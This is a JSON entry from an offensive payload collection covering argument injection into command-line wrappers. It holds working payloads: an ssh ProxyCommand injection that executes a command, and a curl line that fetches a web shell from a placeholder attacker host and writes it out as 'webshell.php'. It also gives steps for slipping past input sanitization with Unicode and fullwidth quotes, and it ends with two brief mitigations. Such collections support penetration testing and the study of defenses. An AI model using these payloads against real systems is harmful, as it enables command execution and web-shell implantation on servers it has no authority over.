{
  "id": "payload_000019",
  "important": {
    "title": "Command Injection - Argument Injection",
    "category": "Web Vulnerabilities",
    "sub_category": "Argument Injection",
    "tags": ["argument-injection","worstfit","quotes","escape"],
    "targets": { "os": ["Linux","Windows"], "system": ["CLI Wrappers","Utilities"] },
    "risk": "high"
  },
  "variants": [
    {
      "match": { "os": ["Any"], "system": ["CLI Wrapper"] },
      "payload": {
        "explanation": "Inject crafted arguments to change behavior of the invoked program (e.g., add ProxyCommand).",
        "code": "ssh '-oProxyCommand=\"touch /tmp/pwned\"' victim@host",
        "run_context": "Input appended into an exec/wrapper that builds a CLI command.",
        "placeholders": { "TARGET_PROGRAM": "ssh", "INJECTION_ARG": "-oProxyCommand=\"touch /tmp/pwned\"" },
        "notes": "Use worstfit and unicode quotes to bypass naive sanitization."
      }
    },
    {
      "match": { "os": ["Windows"], "system": ["Windows Utility"] },
      "payload": {
        "explanation": "Append arguments to Windows utilities to execute side effects.",
        "code": "curl http://attacker/ -o webshell.php",
        "run_context": "When the application constructs a curl/wget command from user input.",
        "placeholders": { "ATTACKER_URL": "http://attacker/" },
        "notes": "Target-specific; argument parsing differs across programs."
      }
    }
  ],
  "usage": {
    "steps": [
      "Analyze how application assembles command + arguments.",
      "Try injecting quoted or escaped argument forms.",
      "Test using variations of fullwidth quotes or alternate Unicode characters."
    ],
    "tools": ["Argument Injection Vectors (Sonar)", "Burp Suite"],
    "code_samples": [
      { "title": "SSH ProxyCommand Injection", "description": "Add ProxyCommand via argument", "code": "ssh '-oProxyCommand=\"touch /tmp/pwned\"' victim@host", "run_context": "cli" },
      { "title": "curl output to file", "description": "Write remote content to file via argument", "code": "curl http://attacker/shell -o webshell.php", "run_context": "cli" }
    ],
    "mitigations": [
      "Avoid concatenating user input into argument strings; use argument arrays or exec APIs.",
      "Validate and strictly whitelist allowed flags/arguments."
    ],
    "references": []
  },
  "system": { "version": "2.0.0", "source": "PayloadsAllTheThings" }
}
